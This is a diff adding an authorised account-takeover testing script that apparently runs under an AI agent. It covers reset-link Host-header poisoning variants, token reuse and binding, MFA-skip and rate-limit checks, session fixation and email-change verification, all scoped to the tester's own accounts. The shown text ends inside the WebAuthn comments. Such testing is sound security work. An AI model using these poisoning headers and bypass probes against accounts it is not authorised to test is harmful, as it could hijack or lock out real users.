@@ -1,0 +1,1503 @@
+#!/usr/bin/env python3
+"""Mythos authflows — account-takeover chains against YOUR OWN accounts.
+
+Login is a state machine (`knowledge/web/auth-flows-ato.md`): every step hands
+the next one a token or a session state that the next one must check. The bugs
+are steps that can be skipped, repeated, reordered or replayed, and tokens that
+are guessable, not bound to a user, or leaked. The research says this is the
+best-paid class in a web programme and the one with the least execution behind
+it, so this script does the mechanical part: build the mutation set, send the
+handful of requests, and judge what comes back.
+
+  scripts/authflows reset <url> ...        password-reset poisoning, token quality,
+                                           reuse, binding, Referer leak
+  scripts/authflows mfa <url> ...          second factor not enforced, step-up gaps,
+                                           remember-device token shape, rate limit
+  scripts/authflows session <url> ...      fixation, cookie flags and scope,
+                                           rotation, survival, concurrency
+  scripts/authflows emailchange <url> ...  verification skipped, pending change
+                                           usable, token not bound
+  scripts/authflows webauthn <url> ...     passkey checks as CDP calls for the
+                                           agent's browser tool, then judge them
+  scripts/authflows --selftest
+
+EVERYTHING HERE RUNS AGAINST ACCOUNTS YOU CREATED AND MAILBOXES YOU CONTROL.
+A reset or an email-change aimed at an address that is not yours is an attack on
+a person, not a test: it mails that person a poisoned link and can lock them out
+of their account. So every subcommand that touches a mail flow demands the
+address explicitly on the command line and sends to no other one, and there is
+no "enumerate the users and try them" mode in this file by design. Two accounts
+you made, `userA` as the victim stand-in and `userB` as the attacker, are the
+whole cast.
+
+No brute force. The rate-limit check in `mfa` measures whether a limit exists
+from at most 6 wrong codes; it never walks the code space. Destination hosts
+(an OAST host in a poisoned header is a destination the target will put in mail)
+are checked against the engagement scope like the target is, and an out-of-scope
+one is refused rather than warned about.
+"""
+import argparse
+import base64
+import binascii
+import hashlib
+import http.cookies
+import importlib.machinery
+import importlib.util
+import json
+import math
+import os
+import pathlib
+import re
+import ssl
+import sys
+import time
+import urllib.error
+import urllib.parse
+import urllib.request
+
+UA = "mythos-authflows/1.0 (authorized security testing)"
+ROOT = pathlib.Path(__file__).resolve().parent.parent
+
+# ---------------------------------------------------------------- plumbing
+
+_mods = {}
+
+
+def mod(name):
+    """Load a sibling hook by path so its logic is called, not copied."""
+    if name not in _mods:
+        rel = {"scope-guard": "hooks/scope-guard.py"}[name]
+        loader = importlib.machinery.SourceFileLoader(
+            f"mythos_{name}".replace("-", "_"), str(ROOT / rel))
+        spec = importlib.util.spec_from_loader(loader.name, loader)
+        m = importlib.util.module_from_spec(spec)
+        loader.exec_module(m)
+        _mods[name] = m
+    return _mods[name]
+
+
+def require_in_scope(*urls_or_hosts):
+    """Refuse out-of-scope destinations instead of warning after the fact.
+
+    The guard that runs around the agent's tool calls only warns, and by then
+    the request has left. Inside one script that is avoidable: nothing here is
+    exploratory enough to justify a slip, and a poisoned reset link points a
+    real mailbox at whatever host is named, so the destination is checked with
+    the same authority as the target.
+    """
+    sg = mod("scope-guard")
+    bad = []
+    for item in urls_or_hosts:
+        if not item:
+            continue
+        probe = item if "//" in str(item) else f"https://{item}/"
+        bad += sg.check(probe)["offenders"]
+    if bad:
+        raise SystemExit("authflows: refusing, out of scope: " + ", ".join(sorted(set(bad))))
+
+
+def scope_rate(default=5.0):
+    """rules.rate_limit_rps from the engagement scope, not a guess.
+
+    PyYAML is optional in this repository, so fall back to a line match. One
+    process doing dozens of requests never passes the agent's budget guard, so
+    the pacing has to live here.
+    """
+    path = os.environ.get("MYTHOS_SCOPE")
+    if not path:
+        return default
+    try:
+        text = pathlib.Path(path).read_text(encoding="utf-8", errors="replace")
+    except OSError:
+        return default
+    try:
+        import yaml  # type: ignore
+        data = yaml.safe_load(text) or {}
+        rules = data.get("rules") or {}
+        if isinstance(rules, dict) and rules.get("rate_limit_rps") is not None:
+            return float(rules["rate_limit_rps"])
+    except Exception:
+        pass
+    m = re.search(r"^\s*rate_limit_rps\s*:\s*([0-9.]+)", text, re.M)
+    try:
+        return float(m.group(1)) if m else default
+    except (TypeError, ValueError):
+        return default
+
+
+_LAST = [0.0]
+_GAP = [0.0]
+_SENT = [0]
+
+
+def pace():
+    gap = _GAP[0]
+    if gap <= 0:
+        return
+    wait = _LAST[0] + gap - time.monotonic()
+    if wait > 0:
+        time.sleep(wait)
+    _LAST[0] = time.monotonic()
+
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    """A redirect is evidence here, so never follow one silently.
+
+    Rotation, fixation and 2FA-skip all read as "where did it send me", and an
+    opener that follows the 302 for us throws that away along with the
+    Set-Cookie on the intermediate response.
+    """
+
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+
+def send(method, url, headers=None, body=None, timeout=10, insecure=False,
+         follow=False):
+    """One request, paced and scope-checked, with the full response back.
+
+    urllib honours http_proxy/https_proxy, which is how the driver's traffic
+    recorder sees these requests (`scripts/traffic env`); nothing extra is
+    needed and a proxy of our own must not be started.
+    """
+    require_in_scope(url)
+    pace()
+    _SENT[0] += 1
+    data = body.encode() if isinstance(body, str) else body
+    req = urllib.request.Request(url, data=data, method=method,
+                                 headers={"User-Agent": UA, **(headers or {})})
+    # The TLS context rides on a handler, not on open(). `urlopen` takes a
+    # `context=` keyword and `OpenerDirector.open` does not, and because we need
+    # our own opener to stop redirects, passing it there raised TypeError on
+    # every single request. The broad `except Exception` below then reported it
+    # as a network error with status None, so the script looked like it was
+    # reaching an unresponsive target while in fact it never sent anything at
+    # all. The selftest now makes one real request against a loopback server,
+    # which is the only check that would have caught this.
+    ctx = ssl._create_unverified_context() if insecure else None
+    handlers = [] if follow else [NoRedirect]
+    if ctx is not None:
+        handlers.append(urllib.request.HTTPSHandler(context=ctx))
+    opener = urllib.request.build_opener(*handlers)
+    try:
+        with opener.open(req, timeout=timeout) as r:
+            raw = r.read(200_000)
+            return {"status": r.status, "headers": _hdrs(r.headers),
+                    "set_cookie": r.headers.get_all("Set-Cookie") or [],
+                    "body": raw.decode("utf-8", "replace"), "url": r.geturl()}
+    except urllib.error.HTTPError as e:
+        raw = e.read(200_000) if e.fp else b""
+        return {"status": e.code, "headers": _hdrs(e.headers or {}),
+                "set_cookie": (e.headers.get_all("Set-Cookie") if e.headers else None) or [],
+                "body": raw.decode("utf-8", "replace"), "url": url}
+    except Exception as e:                        # DNS, TLS, refused, timeout
+        return {"status": None, "headers": {}, "set_cookie": [],
+                "body": f"{type(e).__name__}: {e}", "url": url}
+
+
+def _hdrs(h):
+    try:
+        return {k.lower(): v for k, v in h.items()}
+    except Exception:
+        return {}
+
+
+def form(pairs):
+    return urllib.parse.urlencode(pairs)
+
+
+FORM_CT = {"Content-Type": "application/x-www-form-urlencoded"}
+
+# ---------------------------------------------------- 1. reset poisoning
+
+# Every header a reverse proxy, a framework or a mailer has been seen to trust
+# when it builds an absolute URL. The point is not that one of them is "the"
+# bug: it is that the application should build the link from configured origin
+# and ignore all of them, so the whole set is sent one at a time and the mailbox
+# says which (if any) won.
+def poison_variants(host):
+    """Label -> extra headers, one mutation each. Offline and asserted."""
+    v = [
+        ("host", {"Host": host}),
+        ("x-forwarded-host", {"X-Forwarded-Host": host}),
+        ("x-forwarded-host-port", {"X-Forwarded-Host": host, "X-Forwarded-Port": "80"}),
+        ("x-forwarded-server", {"X-Forwarded-Server": host}),
+        ("forwarded", {"Forwarded": f"host={host}"}),
+        ("x-host", {"X-Host": host}),
+        ("x-original-host", {"X-Original-Host": host}),
+        ("x-original-url", {"X-Original-URL": f"http://{host}/"}),
+        ("x-rewrite-url", {"X-Rewrite-URL": f"http://{host}/"}),
+        ("x-forwarded-proto", {"X-Forwarded-Proto": "http", "X-Forwarded-Host": host}),
+        # A second Host line: some stacks read the first, some the last, and the
+        # mailer may not be the one that answered the request.
+        ("dup-host", {"Host": host, "X-Forwarded-Host": host}),
+        # Host with a trailing port the app may strip before use.
+        ("host-port", {"Host": f"{host}:80"}),
+    ]
+    return v
+
+
+def cmd_reset(a):
+    require_in_scope(a.url, a.oast)
+    out = {"subcommand": "reset", "url": a.url, "email": a.email,
+           "oast": a.oast, "variants": [], "tokens": None, "reuse": None,
+           "referer": None, "notes": []}
+    out["notes"].append(
+        "Mail is requested only for %s. Read that mailbox yourself: a poisoned "
+        "Host reflected in the HTTP response is not the finding, the link host "
+        "in the delivered mail is." % a.email)
+
+    if a.oast:
+        base = send("POST", a.url, dict(FORM_CT), form({a.field: a.email}),
+                    a.timeout, a.insecure)
+        out["variants"].append({"label": "control", "headers": {},
+                                "status": base["status"],
+                                "bytes": len(base["body"]),
+                                "oast_reflected": a.oast in base["body"]})
+        for label, extra in poison_variants(a.oast):
+            r = send("POST", a.url, {**FORM_CT, **extra},
+                     form({a.field: a.email}), a.timeout, a.insecure)
+            out["variants"].append({
+                "label": label, "headers": extra, "status": r["status"],
+                "bytes": len(r["body"]),
+                # A reflection in the response body is a hint about which
+                # header the app trusts, never proof: the mail is the oracle.
+                "oast_reflected": a.oast in r["body"],
+                "location": r["headers"].get("location", "")})
+
+    if a.token:
+        out["tokens"] = analyse_tokens(a.token, email=a.email)
+
+    # Reuse after use, on your own account: consume the token, then present the
+    # same token again. A second acceptance is the finding; the first one just
+    # changed your own password, which is why --new-password is required.
+    if a.confirm_url and a.token and a.new_password:
+        first = send("POST", a.confirm_url, dict(FORM_CT),
+                     form({a.token_field: a.token[0],
+                           a.password_field: a.new_password}),
+                     a.timeout, a.insecure)
+        second = send("POST", a.confirm_url, dict(FORM_CT),
+                      form({a.token_field: a.token[0],
+                            a.password_field: a.new_password + "2"}),
+                      a.timeout, a.insecure)
+        out["reuse"] = {"first": first["status"], "second": second["status"],
+                        "verdict": reuse_verdict(first["status"], second["status"])}
+
+    # Referer leak: the reset page's own third-party assets carry the token in
+    # the Referer unless the page sets a policy that strips it.
+    if a.reset_link:
+        page = send("GET", a.reset_link, {}, None, a.timeout, a.insecure)
+        ext = external_hosts(page["body"], a.reset_link)
+        out["referer"] = {
+            "referrer_policy": page["headers"].get("referrer-policy", ""),
+            "meta_referrer": meta_referrer(page["body"]),
+            "third_party_asset_hosts": ext,
+            "verdict": referer_verdict(page["headers"].get("referrer-policy", ""),
+                                       meta_referrer(page["body"]), ext)}
+    return out
+
+
+def reuse_verdict(first, second):
+    if first is None or second is None:
+        return "inconclusive: a request failed"
+    if first < 400 and second < 400:
+        return "token accepted twice: not consumed on use"
+    if first < 400:
+        return "token consumed on first use (expected)"
+    return "first use rejected: the pair is wrong, re-check before reading the second"
+
+
+SAFE_REFERRER = ("no-referrer", "same-origin", "strict-origin",
+                 "origin", "strict-origin-when-cross-origin",
+                 "origin-when-cross-origin", "no-referrer-when-downgrade")
+
+
+def referer_verdict(header, meta, hosts):
+    policy = (meta or header or "").strip().lower().split(",")[0].strip()
+    if not hosts:
+        return "no third-party assets on the reset page: no Referer path"
+    if policy in ("no-referrer", "same-origin", "strict-origin", "origin"):
+        return f"policy {policy!r} strips the path: token not leaked in Referer"
+    if not policy:
+        return ("no Referrer-Policy and %d third-party asset host(s): the full "
+                "reset URL, token included, reaches them" % len(hosts))
+    return (f"policy {policy!r} with {len(hosts)} third-party asset host(s): "
+            "check whether the path survives for cross-origin requests")
+
+
+def meta_referrer(html):
+    m = re.search(r'<meta[^>]+name=["\']?referrer["\']?[^>]+content=["\']?([a-z-]+)',
+                  html or "", re.I)
+    return m.group(1).lower() if m else ""
+
+
+def external_hosts(html, page_url):
+    """Hosts of script/img/link/iframe sources that are not the page's own."""
+    own = urllib.parse.urlsplit(page_url).netloc.lower()
+    hosts = set()
+    for m in re.finditer(r'(?:src|href)\s*=\s*["\']([^"\']+)', html or "", re.I):
+        ref = m.group(1)
+        net = urllib.parse.urlsplit(urllib.parse.urljoin(page_url, ref)).netloc.lower()
+        if net and net != own:
+            hosts.add(net)
+    return sorted(hosts)
+
+# ---------------------------------------------------- token quality
+
+UUID_RE = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$", re.I)
+HEX_RE = re.compile(r"^[0-9a-f]+$", re.I)
+B64_RE = re.compile(r"^[A-Za-z0-9_\-+/]+=*$")
+DEC_RE = re.compile(r"^[0-9]+$")
+
+
+def alphabet_bits(token):
+    """Upper bound on entropy from the observed alphabet, not a measurement.
+
+    A single token carries no measurable entropy: this says how many bits the
+    shape could hold at best. A structure finding below beats this number.
+    """
+    classes = [(r"[0-9]", 10), (r"[a-f]", 6), (r"[g-z]", 20),
+               (r"[A-F]", 6), (r"[G-Z]", 20), (r"[-_+/=.]", 6)]
+    size = sum(n for pat, n in classes if re.search(pat, token))
+    return round(len(token) * math.log2(size), 1) if size > 1 else 0.0
+
+
+def decode_attempts(token):
+    """What the token decodes to, if anything, so structure is visible."""
+    out = {}
+    if token.count(".") == 2:
+        head = token.split(".")[0]
+        try:
+            pad = head + "=" * (-len(head) % 4)
+            out["jwt_header"] = json.loads(base64.urlsafe_b64decode(pad))
+        except Exception:
+            pass
+    for name, fn in (("base64url", lambda t: base64.urlsafe_b64decode(t + "=" * (-len(t) % 4))),
+                     ("hex", binascii.unhexlify)):
+        try:
+            raw = fn(token)
+        except Exception:
+            continue
+        text = raw.decode("utf-8", "replace")
+        if sum(c.isprintable() for c in text) > 0.8 * max(len(text), 1):
+            out[name] = text[:200]
+    return out
+
+
+def analyse_tokens(tokens, email=None):
+    """Judge a handful of tokens you had mailed to your own addresses.
+
+    This never guesses a live token. It reads the ones you already hold and
+    says whether the shape is predictable, which is the reportable form of
+    "weak reset token": structure you can explain beats any entropy estimate.
+    """
+    tokens = [t.strip() for t in tokens if t and t.strip()]
+    res = {"count": len(tokens), "tokens": [], "shared_prefix": "",
+           "shared_suffix": "", "findings": []}
+    now = time.time()
+    for t in tokens:
+        shape = ("uuid" if UUID_RE.match(t) else "jwt" if t.count(".") == 2
+                 else "decimal" if DEC_RE.match(t) else "hex" if HEX_RE.match(t)
+                 else "base64-ish" if B64_RE.match(t) else "mixed")
+        item = {"token": t[:8] + "…" if len(t) > 12 else t, "length": len(t),
+                "shape": shape, "alphabet_bits_upper_bound": alphabet_bits(t),
+                "decodes": decode_attempts(t), "embeds": []}
+        blob = json.dumps(item["decodes"]) + " " + t
+        if email and (email.lower() in blob.lower()
+                      or hashlib.md5(email.encode()).hexdigest() in t.lower()
+                      or hashlib.sha1(email.encode()).hexdigest() in t.lower()):
+            item["embeds"].append("the account's email address, plain or hashed")
+        for m in re.finditer(r"(?<!\d)(1[6-9]\d{8})(?!\d)", blob):          # unix seconds
+            if abs(int(m.group(1)) - now) < 86400 * 400:
+                item["embeds"].append(f"a current unix timestamp ({m.group(1)})")
+        for m in re.finditer(r"(?<!\d)(1[6-9]\d{11})(?!\d)", blob):         # unix millis
+            if abs(int(m.group(1)) / 1000 - now) < 86400 * 400:
+                item["embeds"].append(f"a current unix timestamp in ms ({m.group(1)})")
+        if item["length"] < 16:
+            item["embeds"].append("shorter than 16 characters")
+        res["tokens"].append(item)
+
+    if len(tokens) > 1:
+        res["shared_prefix"] = os.path.commonprefix(tokens)
+        res["shared_suffix"] = os.path.commonprefix([t[::-1] for t in tokens])[::-1]
+        tails = [t[len(res["shared_prefix"]):] for t in tokens]
+        if all(DEC_RE.match(x or "x") for x in tails) and len(set(tails)) == len(tails):
+            nums = sorted(int(x) for x in tails)
+            if max(b - a for a, b in zip(nums, nums[1:])) <= 16:
+                res["findings"].append(
+                    "the varying part is a near-sequential counter: tokens for "
+                    "other accounts are in a small range around yours")
+        if len(res["shared_prefix"]) >= 4:
+            res["findings"].append(
+                f"{len(res['shared_prefix'])} leading characters are identical "
+                "across tokens: that much of the token is not random")
+
+    bits = [i["alphabet_bits_upper_bound"] for i in res["tokens"]]
+    if bits and max(bits) < 64:
+        res["findings"].append(
+            "no token could hold 64 bits even at best: too small for a reset "
+            "token regardless of the generator")
+    for i in res["tokens"]:
+        for e in i["embeds"]:
+            res["findings"].append(f"{i['token']}: embeds {e}")
+    if not res["findings"]:
+        res["findings"].append(
+            "no structure found in %d sample(s); not evidence of a good "
+            "generator, only that this sample shows nothing" % len(tokens))
+    return res
+
+# ---------------------------------------------------------- 2. MFA
+
+WRONG_CODES = ["000000", "111111", "123456", "000001", "999999", "121212"]
+LIMIT_HEADERS = ("retry-after", "ratelimit-limit", "ratelimit-remaining",
+                 "ratelimit-reset", "x-ratelimit-limit", "x-ratelimit-remaining",
+                 "x-rate-limit-limit")
+
+
+def cmd_mfa(a):
+    require_in_scope(a.url)
+    out = {"subcommand": "mfa", "url": a.url, "skip": [], "stepup": [],
+           "rate_limit": None, "device_token": None, "notes": []}
+
+    # 2.1 The second factor not enforced on a second endpoint. The partial
+    # session is the one the server hands out after the password and before the
+    # OTP; if it already opens an account read, the gate is cosmetic.
+    if a.partial_cookie:
+        for path in a.protected or []:
+            url = urllib.parse.urljoin(a.url, path)
+            with_partial = send("GET", url, {"Cookie": a.partial_cookie},
+                                None, a.timeout, a.insecure)
+            anon = send("GET", url, {}, None, a.timeout, a.insecure)
+            out["skip"].append({
+                "path": path, "partial_status": with_partial["status"],
+                "anon_status": anon["status"],
+                "partial_bytes": len(with_partial["body"]),
+                "canary_in_partial": bool(a.canary and a.canary in with_partial["body"]),
+                "verdict": skip_verdict(with_partial, anon, a.canary)})
+
+    # 2.2 Step-up: the flows that must re-ask even with a full session.
+    if a.full_cookie:
+        for path in a.stepup or []:
+            url = urllib.parse.urljoin(a.url, path)
+            r = send("GET", url, {"Cookie": a.full_cookie}, None,
+                     a.timeout, a.insecure)
+            out["stepup"].append({
+                "path": path, "status": r["status"],
+                "challenged": looks_like_challenge(r),
+                "verdict": ("reached with the session alone: no re-authentication"
+                            if r["status"] and r["status"] < 400 and not looks_like_challenge(r)
+                            else "demands something more (expected)")})
+
+    # 2.3 Rate limit, measured and not ground. Six wrong codes say whether a
+    # limit exists. They do not say what the code is and are not meant to.
+    if a.verify_url:
+        n = min(a.limit_probe, 6)
+        if a.limit_probe > 6:
+            out["notes"].append(
+                "--limit-probe capped at 6: more than that is brute force, "
+                "which this file refuses in every mode")
+        seq = []
+        for code in WRONG_CODES[:n]:
+            body = form({a.code_field: code, **dict(kv.split("=", 1)
+                                                    for kv in a.extra_field)})
+            r = send("POST", a.verify_url,
+                     {**FORM_CT, **({"Cookie": a.partial_cookie} if a.partial_cookie else {})},
+                     body, a.timeout, a.insecure)
+            seq.append({"code": code, "status": r["status"],
+                        "limit_headers": {h: r["headers"][h] for h in LIMIT_HEADERS
+                                          if h in r["headers"]},
+                        "bytes": len(r["body"])})
+        out["rate_limit"] = {"attempts": seq, "verdict": limit_verdict(seq)}
+
+    # 2.4 A remember-device cookie is a bearer token for the second factor.
+    # Forgery is a structure question, so it goes through the same analyser.
+    if a.device_token:
+        out["device_token"] = analyse_tokens(a.device_token, email=a.email)
+        out["notes"].append(
+            "A remember-device token that embeds the user id or a timestamp is "
+            "forgeable for userB; prove it by using the forged value in a "
+            "clean context on an account you own, never on anyone else's.")
+    return out
+
+
+def skip_verdict(partial, anon, canary):
+    if partial["status"] is None:
+        return "inconclusive: request failed"
+    if canary and canary in partial["body"]:
+        return "account data reached with the partial session: second factor not enforced"
+    if partial["status"] < 400 and (anon["status"] or 0) >= 400:
+        return ("200 for the partial session where anonymous gets %s: likely not "
+                "enforced, confirm with a canary only you can see" % anon["status"])
+    if partial["status"] >= 400:
+        return "partial session rejected (expected)"
+    return "both the partial session and anonymous succeed: the path is public, not a bypass"
+
+
+def looks_like_challenge(r):
+    if r["status"] in (401, 403):
+        return True
+    low = (r["body"] or "")[:4000].lower()
+    loc = r["headers"].get("location", "").lower()
+    return any(w in low or w in loc for w in
+               ("otp", "one-time", "two-factor", "2fa", "verification code",
+                "confirm your password", "current password", "re-authenticate"))
+
+
+def limit_verdict(seq):
+    codes = [s["status"] for s in seq]
+    if any(c == 429 for c in codes):
+        return f"limited: 429 after {codes.index(429) + 1} wrong code(s)"
+    if any(s["limit_headers"] for s in seq):
+        return "no 429 within the probe, but the server advertises rate-limit headers"
+    if len(set(codes)) == 1 and codes[0] is not None:
+        return (f"no limit observed over {len(codes)} wrong codes (all {codes[0]}): "
+                "candidate only. Do not continue; a limit may start later and "
+                "finding out costs a brute force.")
+    return f"status varied over the probe ({codes}): read the bodies before judging"
+
+# ------------------------------------------------- 3. session lifecycle
+
+
+def parse_cookies(set_cookie_lines):
+    """Name -> attributes, for flag and scope judging."""
+    out = {}
+    for line in set_cookie_lines or []:
+        jar = http.cookies.SimpleCookie()
+        try:
+            jar.load(line)
+        except Exception:
+            continue
+        for name, morsel in jar.items():
+            low = line.lower()
+            out[name] = {"value": morsel.value,
+                         "secure": "secure" in low,
+                         "httponly": "httponly" in low,
+                         "samesite": (morsel["samesite"] or "").lower() or "(unset)",
+                         "domain": morsel["domain"] or "",
+                         "path": morsel["path"] or "",
+                         "max_age": morsel["max-age"] or morsel["expires"] or ""}
+    return out
+
+
+def judge_cookie(name, attrs, host):
+    """Flags and scope. Scope is the part that decides exploitability.
+
+    A session cookie set on the parent domain is readable and writable from
+    every sibling subdomain, which is exactly the plant path a fixation finding
+    needs; without one, fixation stays low.
+    """
+    notes = []
+    if not attrs["secure"]:
+        notes.append("no Secure: sent over plaintext http")
+    if not attrs["httponly"]:
+        notes.append("no HttpOnly: readable by script, so any XSS is a session theft")
+    if attrs["samesite"] in ("(unset)", "none"):
+        notes.append(f"SameSite={attrs['samesite']}: cross-site requests carry it (CSRF surface)")
+    dom = attrs["domain"].lstrip(".").lower()
+    if dom and host.lower() != dom and host.lower().endswith(dom):
+        notes.append(f"scoped to the parent domain {dom}: every sibling subdomain "
+                     "can read it and can plant one (a fixation plant path)")
+    if name.startswith("__Host-") and (attrs["domain"] or attrs["path"] != "/"):
+        notes.append("__Host- prefix with Domain or a non-root Path: the prefix's "
+                     "guarantee does not hold")
+    if name.startswith("__Secure-") and not attrs["secure"]:
+        notes.append("__Secure- prefix without the Secure attribute")
+    return notes or ["flags look sane"]
+
+
+def cmd_session(a):
+    require_in_scope(a.url)
+    host = urllib.parse.urlsplit(a.url).netloc.split(":")[0]
+    out = {"subcommand": "session", "url": a.url, "pre_login_cookies": {},
+           "fixation": None, "flags": {}, "survival": None,
+           "concurrent": None, "notes": []}
+
+    pre = send("GET", a.url, {}, None, a.timeout, a.insecure)
+    pre_jar = parse_cookies(pre["set_cookie"])
+    out["pre_login_cookies"] = {k: {kk: vv for kk, vv in v.items() if kk != "value"}
+                                for k, v in pre_jar.items()}
+    for name, attrs in pre_jar.items():
+        out["flags"][name] = judge_cookie(name, attrs, host)
+
+    if a.login_url and a.username and a.password:
+        s0 = "; ".join(f"{k}={v['value']}" for k, v in pre_jar.items())
+        post = send("POST", a.login_url,
+                    {**FORM_CT, **({"Cookie": s0} if s0 else {})},
+                    form({a.user_field: a.username, a.password_field: a.password}),
+                    a.timeout, a.insecure)
+        after = parse_cookies(post["set_cookie"])
+        for name, attrs in after.items():
+            out["flags"][name] = judge_cookie(name, attrs, host)
+        out["fixation"] = {
+            "pre_login": {k: v["value"][:6] + "…" for k, v in pre_jar.items()},
+            "post_login_set": sorted(after),
+            "status": post["status"],
+            "verdict": fixation_verdict(pre_jar, after)}
+
+        # Does the pre-login id, replayed from a clean context, own the session?
+        # That is the proof, not the absence of a Set-Cookie.
+        if s0 and a.me:
+            me = send("GET", urllib.parse.urljoin(a.url, a.me), {"Cookie": s0},
+                      None, a.timeout, a.insecure)
+            out["fixation"]["replay_pre_login_id"] = {
+                "status": me["status"],
+                "canary_present": bool(a.canary and a.canary in me["body"]),
+                "verdict": ("the pre-login id is now an authenticated session: "
+                            "fixation proven" if a.canary and a.canary in me["body"]
+                            else "pre-login id does not reach the account (good, "
+                                 "or the canary is wrong)")}
+
+    # The old cookie after a password change or a logout: the server must have
+    # dropped it. Whatever --after-url does is an action on your own account.
+    if a.cookie and a.after_url and a.me:
+        before = send("GET", urllib.parse.urljoin(a.url, a.me),
+                      {"Cookie": a.cookie}, None, a.timeout, a.insecure)
+        send("POST", a.after_url, {**FORM_CT, "Cookie": a.cookie},
+             a.after_body or "", a.timeout, a.insecure)
+        replay = send("GET", urllib.parse.urljoin(a.url, a.me),
+                      {"Cookie": a.cookie}, None, a.timeout, a.insecure)
+        out["survival"] = {
+            "before": before["status"], "after": replay["status"],
+            "canary_after": bool(a.canary and a.canary in replay["body"]),
+            "verdict": ("the old session still reads the account after the change: "
+                        "no server-side invalidation"
+                        if (replay["status"] or 500) < 400
+                        and (not a.canary or a.canary in replay["body"])
+                        else "old session rejected after the change (expected)")}
+
+    if a.cookie and a.second_cookie and a.me:
+        first = send("GET", urllib.parse.urljoin(a.url, a.me),
+                     {"Cookie": a.cookie}, None, a.timeout, a.insecure)
+        second = send("GET", urllib.parse.urljoin(a.url, a.me),
+                      {"Cookie": a.second_cookie}, None, a.timeout, a.insecure)
+        out["concurrent"] = {
+            "first": first["status"], "second": second["status"],
+            "verdict": ("both sessions live: no concurrent-session policy "
+                        "(a design note, not a finding on its own)"
+                        if (first["status"] or 500) < 400 and (second["status"] or 500) < 400
+                        else "one of the two was invalidated: a policy exists")}
+    return out
+
+
+def fixation_verdict(pre, post):
+    if not pre:
+        return "no cookie before login: nothing to fixate"
+    if not post:
+        return ("login set no cookie at all: the pre-login id is still the "
+                "session id, which is fixation unless the id is unguessable "
+                "and unplantable")
+    moved = [k for k in pre if k in post and pre[k]["value"] != post[k]["value"]]
+    kept = [k for k in pre if k in post and pre[k]["value"] == post[k]["value"]]
+    if kept and not moved:
+        return f"the id in {', '.join(kept)} is unchanged across login: fixation"
+    if moved:
+        return f"rotated at login: {', '.join(moved)} (expected)"
+    return "login issued new cookie names; check which one carries the session"
+
+# -------------------------------------------------- 4. email change
+
+
+def cmd_emailchange(a):
+    require_in_scope(a.url)
+    out = {"subcommand": "emailchange", "url": a.url, "new_email": a.new_email,
+           "change": None, "effect_before_verification": None,
+           "password_required": None, "token": None, "binding": None,
+           "notes": ["Both addresses must be mailboxes you own. The pre-hijack "
+                     "variant in knowledge/web/auth-flows-ato.md is run with "
+                     "your own userA and userB and nothing else."]}
+
+    changed = send("POST", a.url, {**FORM_CT, "Cookie": a.cookie},
+                   form({a.field: a.new_email,
+                         **({a.password_field: a.password} if a.password else {})}),
+                   a.timeout, a.insecure)
+    out["change"] = {"status": changed["status"], "bytes": len(changed["body"])}
+
+    # The same change with the current password omitted. If it still lands, the
+    # flow is reachable from a session alone, which is what makes an XSS or a
+    # CSRF into an account takeover.
+    if a.password:
+        no_pw = send("POST", a.url, {**FORM_CT, "Cookie": a.cookie},
+                     form({a.field: a.new_email}), a.timeout, a.insecure)
+        out["password_required"] = {
+            "status_without_password": no_pw["status"],
+            "verdict": ("accepted without the current password: session alone "
+                        "changes the login address"
+                        if (no_pw["status"] or 500) < 400
+                        else "rejected without the current password (expected)")}
+
+    # Is the pending address already live? Three places it must not be yet.
+    if a.me:
+        me = send("GET", urllib.parse.urljoin(a.url, a.me),
+                  {"Cookie": a.cookie}, None, a.timeout, a.insecure)
+        live = a.new_email.lower() in (me["body"] or "").lower()
+        out["effect_before_verification"] = {
+            "profile_shows_new": live,
+            "verdict": ("the unverified address is already the account's "
+                        "address: verification is decoration"
+                        if live else "profile still shows the old address (expected)")}
+    if a.old_email and a.reset_url:
+        r = send("POST", a.reset_url, dict(FORM_CT),
+                 form({"email": a.old_email}), a.timeout, a.insecure)
+        out["notes"].append(
+            "a reset was requested for the OLD address %s (status %s); check "
+            "which mailbox the link arrives in: the old one still working after "
+            "the change is the takeover path" % (a.old_email, r["status"]))
+
+    if a.token:
+        out["token"] = analyse_tokens(a.token, email=a.new_email)
+
+    # Binding: userA's verification token presented in userB's session. Both
+    # accounts are yours, so a success is provable and harms nobody.
+    if a.token and a.verify_url and a.other_cookie:
+        r = send("GET", a.verify_url.replace("{token}", a.token[0]),
+                 {"Cookie": a.other_cookie}, None, a.timeout, a.insecure)
+        out["binding"] = {
+            "status": r["status"],
+            "verdict": ("userA's token accepted in userB's session: the token is "
+                        "not bound to the account. Prove it by logging in as "
+                        "userB afterwards."
+                        if (r["status"] or 500) < 400
+                        else "token rejected in the other session (expected)")}
+    return out
+
+# ------------------------------------------------------- 5. WebAuthn
+
+# These are the Relying-Party checks from W3C WebAuthn Level 3 §7.2, read at
+# the source on 2026-11-14. The step numbers below are the ones that matter for
+# a passkey flow, and each turns into a thing the virtual authenticator can do:
+#
+#   §7.2  "Verify that the value of C.type is the string webauthn.get"
+#   §7.2  "Verify that the value of C.challenge equals the base64url encoding
+#          of pkOptions.challenge"
+#   §7.2  "Verify that the value of C.origin is an origin expected by the
+#          Relying Party" and §13.4.9 "The Relying Party MUST NOT accept
+#          unexpected values of origin"
+#   §7.2  "Verify that the rpIdHash in authData is the SHA-256 hash of the
+#          RP ID expected by the Relying Party"
+#   §7.2  "Verify that the UP bit of the flags in authData is set"
+#   §7.2  "If the BE bit of the flags in authData is not set, verify that the
+#          BS bit is not set"
+#   §13.4.3 challenges "MUST contain enough entropy ... SHOULD therefore be at
+#          least 16 bytes long" and the returned value "MUST match what was
+#          generated"
+#
+# One correction to the secondary sources the research note rests on: a
+# signCount that does not increase is NOT a spec violation. §7.2 says a
+# counter less than or equal to the stored one "is a signal, but not proof,
+# that the authenticator may be cloned", and "whether the Relying Party ...
+# fails the authentication ceremony or not, is Relying Party-specific". Synced
+# passkeys legitimately report 0 forever. So a rollback that is accepted is an
+# observation about clone detection, never a finding on its own, and this script
+# grades it that way.
+#
+# Likewise an over-broad RP ID is explicitly allowed by §13.4.9 (an RP "might
+# parse origin structurally and require that ... the authority equals or is any
+# subdomain of the RP ID"), with a pointer to the subdomain risk in §13.4.8, and
+# §5.11 related-origin requests make a second origin legitimate when the RP
+# publishes it at /.well-known/webauthn. Check for that file before calling a
+# cross-origin acceptance a bug.
+
